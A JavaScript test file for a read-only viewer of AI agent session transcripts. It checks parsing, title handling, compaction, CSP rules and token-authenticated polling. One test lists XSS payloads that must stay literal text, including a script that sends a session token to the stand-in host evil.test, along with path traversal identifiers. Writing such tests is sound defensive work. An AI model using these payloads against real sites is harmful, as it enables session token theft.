import test from 'node:test'
import assert from 'node:assert/strict'
import { readFile } from 'node:fs/promises'
import vm from 'node:vm'
import { canRenderMarkdown, parseControlTranscript, sessionEndpoint } from './control-transcript.mjs'

const envelope = (value) => ({ sessionId: 's1', agentId: 'main', ...value })
const message = (role, blocks, id = 'm1') => envelope({ type: 'message', message: { id, role, createdAt: '2026-09-05T10:00:00Z', blocks } })
const line = (value) => JSON.stringify(value)
const jsonl = (...values) => values.map(line).join('\n') + '\n'
const textBlock = (text) => ({ type: 'text', text })

test('real message.blocks preserves full user/assistant text and order without truncation', () => {
  const long = '完整文本\n'.repeat(20000)
  const result = parseControlTranscript(jsonl(message('user', [textBlock(long)]), message('assistant', [textBlock('**回答**'), textBlock('后续文本')], 'm2')))
  assert.equal(result.entries.length, 2)
  assert.equal(result.entries[0].blocks[0].text, long)
  assert.equal(result.entries[0].role, 'user')
  assert.equal(result.entries[1].id, 'm2')
  assert.deepEqual(result.entries[1].blocks.map((b) => b.text), ['**回答**', '后续文本'])
  assert.equal(result.entries[0].createdAt, '2026-09-05T10:00:00Z')
})

test('tool_use input and tool_result output preserve names, correlation, status and data', () => {
  const result = parseControlTranscript(jsonl(
    message('assistant', [{ type: 'tool_use', id: 'call-1', name: 'terminal_run', input: { cmd: 'echo hello' } }]),
    message('tool_result', [{ type: 'tool_result', toolUseId: 'call-1', name: 'terminal_run', ok: true, output: { stdout: 'hello\n', code: 0 } }]),
    message('tool_result', [{ type: 'tool_result', toolUseId: 'call-2', name: 'file_read', ok: false, output: 'not found' }]),
  ))
  const [call, success, failure] = result.entries.map((e) => e.blocks[0])
  assert.equal(call.toolUseId, success.toolUseId)
  assert.equal(call.name, 'terminal_run')
  assert.deepEqual(JSON.parse(call.text), { cmd: 'echo hello' })
  assert.deepEqual(JSON.parse(success.text), { stdout: 'hello\n', code: 0 })
  assert.equal(success.ok, true)
  assert.equal(failure.ok, false)
  assert.equal(failure.text, 'not found')
})

test('latest nonempty title wins; compact retains history but never replays replacementMessages', () => {
  const result = parseControlTranscript(jsonl(
    envelope({ type: 'title', title: '初始标题' }),
    message('user', [textBlock('before')]),
    envelope({ type: 'compact', reason: 'manual', windowNumber: 2, report: { tokens: 42 }, replacementMessages: [message('assistant', [textBlock('summary')]).message] }),
    message('assistant', [textBlock('after')]),
    envelope({ type: 'title', kind: 'refinement', title: '  新的\n标题  ' }),
    envelope({ type: 'title', title: ' ' }),
  ))
  assert.equal(result.title, '新的 标题')
  assert.deepEqual(result.entries.map((e) => e.type), ['message', 'compact', 'message'])
  assert.equal(result.entries[0].blocks[0].text, 'before')
  assert.equal(result.entries[2].blocks[0].text, 'after')
  assert.equal(result.entries[1].replacementCount, 1)
  assert.equal(result.entries[1].windowNumber, 2)
  assert.deepEqual(JSON.parse(result.entries[1].report), { tokens: 42 })
})

test('legacy compact without replacementMessages is still a visible boundary', () => {
  assert.equal(parseControlTranscript(jsonl(envelope({ type: 'compact' }))).entries[0].replacementCount, 0)
})

test('reset clears historical display and title, as the engine display store does', () => {
  const result = parseControlTranscript(jsonl(envelope({ type: 'title', title: 'old' }), message('user', [textBlock('old')]), envelope({ type: 'reset' }), message('user', [textBlock('new')])))
  assert.equal(result.title, '')
  assert.deepEqual(result.entries.map((e) => e.type), ['notice', 'message'])
  assert.equal(result.entries[1].blocks[0].text, 'new')
})

test('incomplete final JSON is deferred; a complete unterminated final record is accepted', () => {
  const complete = line(message('user', [textBlock('ok')]))
  const result = parseControlTranscript(complete + '\n{"type":"message"')
  assert.equal(result.entries.length, 1)
  assert.equal(result.incompleteTail, true)
  assert.equal(result.warnings.length, 0)
  assert.equal(parseControlTranscript(complete).entries.length, 1)
  assert.equal(parseControlTranscript(complete).incompleteTail, false)
})

test('malformed middle lines and shapes warn, valid records after them survive, CRLF/BOM supported', () => {
  const result = parseControlTranscript('\uFEFF' + line(message('user', [textBlock('a')])) + '\r\n{bad}\r\nnull\r\n' + line(envelope({ type: 'message', message: {} })) + '\r\n' + line(message('assistant', [textBlock('b')])) + '\r\n')
  assert.equal(result.entries.length, 2)
  assert.equal(result.warnings.length, 3)
  assert.equal(result.incompleteTail, false)
  assert.throws(() => parseControlTranscript({}), TypeError)
})

test('malicious HTML, command markup and resource URLs stay exact literal text', () => {
  const inputs = [
    '<script>fetch("https://evil.test/?token="+sessionStorage.getItem("neo-control-token"))</script>',
    '<img src="https://evil.test/pixel" onerror="alert(1)">',
    '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    '[run](javascript:alert(1))', '![pixel](//evil.test/pixel)',
    '[local](/api/execute?cmd=rm)', '<command>delete files</command>',
    'https://evil.test/leak', 'www.evil.test', '![reference][asset]\n[asset]: /private',
  ]
  for (const input of inputs) {
    const result = parseControlTranscript(jsonl(message('assistant', [textBlock(input)])))
    assert.equal(result.entries[0].blocks[0].text, input)
    assert.equal(canRenderMarkdown(input), false, input)
  }
  assert.equal(canRenderMarkdown('## 标题\n**加粗**\n\n```js\nconst n = 1\n```'), true)
})

test('image payload and storage are not turned into resource URLs or fetched', () => {
  const result = parseControlTranscript(jsonl(message('user', [{ type: 'image', mimeType: 'image/png', data: 'SECRET_BASE64', label: '截图', storage: { path: 'C:/private/image.png' } }])))
  assert.equal(result.entries[0].blocks[0].type, 'image')
  assert.match(result.entries[0].blocks[0].text, /资源文件不随会话文本上传/)
  assert.doesNotMatch(JSON.stringify(result), /SECRET_BASE64|C:\/private/)
})

test('configuration/content replacement and unknown records are inert notices', () => {
  const result = parseControlTranscript(jsonl(
    message('tool_result', [{ type: 'tool_result', output: 'original', ok: true }]),
    ...['content-replacement', 'app-prompt', 'fast-mode', 'context-window', 'execute-command'].map((type) => envelope({ type, replacements: [{ replacement: 'modified' }], cmd: 'do not run' })),
    message('assistant', [{ type: 'thinking', text: 'thinking' }, { type: 'future', html: '<b>raw</b>' }]),
  ))
  assert.equal(result.entries[0].blocks[0].text, 'original')
  assert.ok(result.entries.slice(1, 6).every((e) => e.type === 'notice'))
  assert.equal(result.entries[6].blocks[0].text, 'thinking')
  assert.equal(result.entries[6].blocks[1].type, 'unknown')
})

test('endpoint always uses fixed same-origin GET path and encoded identifiers', () => {
  assert.equal(sessionEndpoint('设备 a', 's?#%'), '/api/sessions/%E8%AE%BE%E5%A4%87%20a/s%3F%23%25')
  for (const bad of ['', '.', '..', '/evil', '..\\evil', 'a\nb', null]) {
    assert.throws(() => sessionEndpoint(bad, 's'))
    assert.throws(() => sessionEndpoint('d', bad))
  }
})

const componentUrl = new URL('./src/ControlSessionViewer.vue', import.meta.url)
test('entry/CSP/template isolation: no runtime, raw HTML, resource binding or mutation controls', async () => {
  const html = await readFile(new URL('./control-viewer.html', import.meta.url), 'utf8')
  const component = await readFile(componentUrl, 'utf8')
  const entry = await readFile(new URL('./src/control-viewer.js', import.meta.url), 'utf8')
  for (const directive of ["default-src 'none'", "img-src 'none'", "media-src 'none'", "frame-src 'none'", "object-src 'none'", "connect-src 'self'", "form-action 'none'", "base-uri 'none'"]) assert.ok(html.includes(directive), directive)
  assert.doesNotMatch(html, /unsafe-inline|unsafe-eval/)
  assert.match(component, /import StreamingMarkdown from '.\/components\/StreamingMarkdown.vue'/)
  assert.doesNotMatch(component, /v-html|:src=|:href=|<iframe|<input|<textarea|method: '(?:POST|PUT|DELETE|PATCH)'/)
  assert.doesNotMatch(entry, /import .*?(?:engine|runtime|App\.vue)/)
  assert.match(component, /<details v-else-if="block.type === 'tool_use' \|\| block.type === 'tool_result'"/)
})

test('polling uses token, GET/ETag/304, aborts on teardown, and only schedules 2-second retries', async () => {
  const source = await readFile(componentUrl, 'utf8')
  const script = source.match(/<script setup>([\s\S]*?)<\/script>/)[1].replace(/^import .*$/gm, '')
  const requests = []
  const scheduled = []
  let mount
  let unmount
  let token = 'token-one'
  const responses = [
    { status: 200, ok: true, headers: { get: () => '"v1"' }, json: async () => ({ meta: { title: 'title' }, transcript: jsonl(message('user', [textBlock('hello')])) }) },
    { status: 304, ok: false },
    { status: 401, ok: false },
  ]
  const context = vm.createContext({
    URLSearchParams, AbortController, Element: class {}, parseControlTranscript, sessionEndpoint, canRenderMarkdown,
    window: { location: { search: '?deviceId=d1&sessionId=s1' } },
    sessionStorage: { getItem(key) { assert.equal(key, 'neo-control-token'); return token } },
    ref: (value) => ({ value }), shallowRef: (value) => ({ value }), computed: (get) => ({ get value() { return get() } }),
    onMounted: (fn) => { mount = fn }, onBeforeUnmount: (fn) => { unmount = fn },
    setTimeout: (fn, ms) => { scheduled.push({ fn, ms }); return scheduled.length }, clearTimeout: () => {},
    fetch: async (url, options) => { requests.push({ url, options }); return responses.shift() },
  })
  vm.runInContext(script + '\nglobalThis.state = { view, error, loaded, refresh };', context)
  await mount()
  assert.equal(requests[0].url, '/api/sessions/d1/s1')
  assert.equal(requests[0].options.method, 'GET')
  assert.equal(requests[0].options.headers.Authorization, 'Bearer token-one')
  assert.equal(requests[0].options.redirect, 'error')
  assert.equal(requests[0].options.credentials, 'omit')
  assert.equal(scheduled.at(-1).ms, 2000)
  const original = context.state.view.value
  await context.state.refresh()
  assert.equal(requests[1].options.headers['If-None-Match'], '"v1"')
  assert.equal(context.state.view.value, original)
  token = 'token-two'
  await context.state.refresh()
  assert.equal(requests[2].options.headers.Authorization, 'Bearer token-two')
  assert.equal(requests[2].options.headers['If-None-Match'], undefined)
  assert.equal(context.state.loaded.value, false)
  assert.equal(context.state.view.value.entries.length, 0)
  assert.match(context.state.error.value, /无权/)
  unmount()
  await context.state.refresh()
  assert.equal(requests.length, 3)
})
